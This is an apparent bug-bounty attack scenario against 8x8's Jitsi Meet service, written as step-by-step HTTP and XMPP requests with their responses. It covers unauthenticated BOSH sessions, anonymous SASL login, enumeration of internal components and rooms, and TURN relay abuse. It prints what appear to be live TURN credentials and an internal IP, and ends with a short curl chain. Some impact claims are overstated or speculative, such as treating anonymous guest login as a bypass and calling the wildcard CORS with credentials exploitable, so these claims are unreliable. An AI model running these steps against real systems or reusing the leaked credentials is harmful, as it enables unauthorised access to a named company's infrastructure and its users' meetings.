# Attack Scenario: Anonymous XMPP Infiltration of 8x8's Internal Service Mesh

## Phase 1: Reconnaissance

The hacker starts with the bounty scope: `*.8x8.vc` — any subdomain.

A DNS sweep reveals interesting subdomains:

```
8x8.vc                   → Cloudflare
focus.8x8.vc             → Cloudflare
conference.8x8.vc        → Cloudflare
```

Visiting `https://8x8.vc` returns a Jitsi Meet SPA ("8x8 Work"). The hacker inspects the page source and finds a critical file:

```
GET https://8x8.vc/config.js
```

This exposes Jitsi's internal configuration — XMPP domain, SSO parameters, API keys. Most importantly, it reveals the BOSH URL:

```javascript
// From config.js
bosh: '//8x8.vc/http-bind'
```

## Phase 2: Discovering the Open Gate

The hacker probes `https://8x8.vc/http-bind` — an XMPP BOSH (Bidirectional-streams Over Synchronous HTTP) endpoint. This is the HTTP bridge to 8x8's internal XMPP server (Prosody).

**First discovery: CORS misconfiguration**

```http
OPTIONS /http-bind HTTP/1.1
Host: 8x8.vc
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, OPTIONS
```

Any website on the internet can make authenticated cross-origin requests to 8x8's internal XMPP bus. The `Allow-Credentials: true` with `*` is a textbook CORS misconfiguration.

**Second discovery: No authentication required**

The hacker sends a raw BOSH request:

```xml
POST /http-bind HTTP/1.1
Host: 8x8.vc
Content-Type: text/xml; charset=utf-8

<body xmlns="http://jabber.org/protocol/httpbind"
      to="8x8.vc" xml:lang="en" wait="30" hold="1"
      content="text/xml; charset=utf-8" ver="1.6"
      rid="584729301"/>
```

Response:

```xml
<body xmlns="http://jabber.org/protocol/httpbind"
      sid="635e053d-9a92-4f66-a724-6c8bceb6e364"
      wait="30" requests="2" hold="1"
      from="8x8.vc" authid="8x8.vc"/>
```

A session is created instantly. No credentials needed. Now the hacker has `SID=635e053d-...`.

## Phase 3: The Authentication Bypass

The hacker attempts SASL authentication. The standard XMPP flow would require credentials (PLAIN, SCRAM-SHA-1). But the server advertises a different mechanism:

```xml
<auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"
      mechanism="ANONYMOUS"/>
```

Response:

```xml
<success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/>
```

**The bypass is complete.** The hacker is now an authenticated XMPP user on 8x8's internal Prosody server — without a username, password, or any verification. The server treats anonymous users as fully authenticated entities inside the XMPP mesh.

## Phase 4: Establishing Identity

The hacker binds a resource to get a full JID:

```xml
<iq type="set" id="b1">
  <bind xmlns="urn:ietf:params:xml:ns:xmpp-bind">
    <resource>exploit</resource>
  </bind>
</iq>
```

Response:

```xml
<iq type="result" id="b1">
  <bind xmlns="urn:ietf:params:xml:ns:xmpp-bind">
    <jid>c6ce286f-bc38-4495-b661-ee1d25464d05@8x8.vc/exploit</jid>
  </bind>
</iq>
```

The hacker now has a valid XMPP identity: `c6ce286f-...@8x8.vc/exploit`. This JID is indistinguishable from a legitimate user's JID to all internal components.

## Phase 5: Mapping the Internal Infrastructure

The bind response contains a `<message>` with inline `disco#info` and `services` data. This leaks the entire internal infrastructure map:

**Internal Components (12 services):**

| Component | Hostname | Purpose |
|-----------|----------|---------|
| AV Moderation | `avmoderation.8x8.vc` | Audio/video moderation controls |
| File Sharing | `filesharing.8x8.vc` | Meeting file uploads/downloads |
| Polls | `polls.8x8.vc` | Meeting polling system |
| Room Metadata | `metadata.8x8.vc` | Room names, settings, passwords? |
| Speaker Stats | `speakerstats.8x8.vc` | Active speaker tracking |
| Breakout Rooms | `breakout.8x8.vc` | Breakout session management |
| Lobby Rooms | `lobby.8x8.vc` | Meeting lobby/waiting room |
| Visitors | `visitors.8x8.vc` | Visitor tracking system |
| Conference Duration | `conferenceduration.8x8.vc` | Meeting timing |
| MUC | `conference.8x8.vc` | Multi-user chat rooms |
| Focus | `focus.8x8.vc` | Jitsi Focus — conference manager |
| Prosody | `8x8.vc` | XMPP server |

**Infrastructure details leaked:**
- Shard: `prod-8x8-us-phoenix-1-s3` (exact data center location)
- Region: `us-west-2` (AWS region)
- Release: `6741` (Jitsi build number)
- TURN relay: `prod-8x8-turnrelay-oracle.jitsi.net:443` (Oracle Cloud `129.146.219.44`)

## Phase 6: Probing for Vulnerabilities

The hacker queries each component for its capabilities:

```xml
<iq type="get" id="d1" to="filesharing.8x8.vc">
  <query xmlns="http://jabber.org/protocol/disco#info"/>
</iq>
```

```xml
<iq type="get" id="d2" to="metadata.8x8.vc">
  <query xmlns="http://jabber.org/protocol/disco#info"/>
</iq>
```

Each component responds with its supported protocol namespaces. The hacker searches for namespaces that imply privileged operations:

- `http://jitsi.org/protocol/focus` — Conference creation/manipulation
- `http://jitsi.org/protocol/muc#owner` — Room ownership
- `http://jitsi.org/protocol/colibri` — Videobridge channel control
- `http://jabber.org/protocol/commands` — Ad-hoc commands
- `jabber:iq:register` — User registration
- `http://jabber.org/protocol/admin` — Server administration

## Phase 7: Meeting Room Enumeration

The hacker queries the MUC service for active rooms:

```xml
<iq type="get" id="d3" to="conference.8x8.vc">
  <query xmlns="http://jabber.org/protocol/disco#items"/>
</iq>
```

If rooms exist, the hacker can:
- Join unprotected meetings without being detected
- Eavesdrop on chat messages
- Extract participant lists
- Upload malicious files to shared file repositories
- Manipulate polls

## Phase 8: TURN Relay Abuse

The bind response also leaks TURN credentials via XEP-0215 (External Service Discovery):

```xml
<services xmlns="urn:xmpp:extdisco:2">
  <service transport="udp" type="stun"
           host="prod-8x8-turnrelay-oracle.jitsi.net" port="443"/>
  <service username="1783374076" password="H+VMYLlsnjrmMGxunFSapGyizBM="
           transport="udp" port="443" restricted="1" type="turn"
           host="prod-8x8-turnrelay-oracle.jitsi.net"/>
  <service username="1783374076" password="H+VMYLlsnjrmMGxunFSapGyizBM="
           transport="tcp" port="443" restricted="1" type="turns"
           host="prod-8x8-turnrelay-oracle.jitsi.net"/>
</services>
```

The hacker can:
- **Refresh credentials indefinitely** — Each new anonymous BOSH session yields fresh credentials
- **Verify STUN binding** — The STUN service (unrestricted) confirms connectivity from any source IP
- **Attempt TURN allocation** — Even with `restricted=1`, the credentials might be checked only against a whitelist of authorized videobridge IPs, which the hacker could bypass if they control an endpoint on one of those IPs

## Final Harm / Impact

### Impact 1: Internal Network Pivot
The hacker has a **persistent, authenticated connection to 8x8's internal service mesh** without any user credentials. Every internal XMPP component is reachable for probing. If any component trusts the anonymous JID, the hacker gains unauthorized access to file stores, meeting data, and moderation controls.

### Impact 2: Meeting Infiltration
If meeting rooms are discoverable, the hacker joins calls anonymously — listening to audio, reading chat, viewing shared files. In a corporate context, this means access to board meetings, executive calls, and client conversations.

### Impact 3: TURN Relay as Attack Platform
The TURN relay on Oracle Cloud (`129.146.219.44`) can be abused for:
- Egress traffic that bypasses corporate firewalls (TCP/443 looks like HTTPS)
- Financial cost to 8x8 (Oracle egress at ~$0.08/GB)
- Potential amplification vector if the relay processes large STUN responses

### Impact 4: Supply Chain / Secondary Targets
Infrastructure metadata (shard ID, region, release number, HAProxy hostnames) feeds further attacks. Knowing the exact build number (`6741`) allows targeting known Jitsi CVEs.

### Impact 5: Cross-Site Exploitation at Scale
The CORS misconfiguration means any website can weaponize this against 8x8 users visiting malicious sites. A drive-by page can:
1. Open XMPP sessions from the victim's browser
2. Enumerate meetings the victim has access to (via cookies)
3. Exfiltrate meeting metadata

## Summary

An unauthenticated attacker with zero knowledge can, in under 10 HTTP requests:

```
curl → config.js (find BOSH URL)
curl → http-bind (get SID)
curl → ANONYMOUS auth (bypass authentication)
curl → bind (get JID + internal infrastructure + TURN credentials)
```

From there, the entire internal XMPP service mesh is reachable for probing, exploitation, and data access — with no credentials, no logs of a "real user," and no indication that an anonymous session was unauthorized.
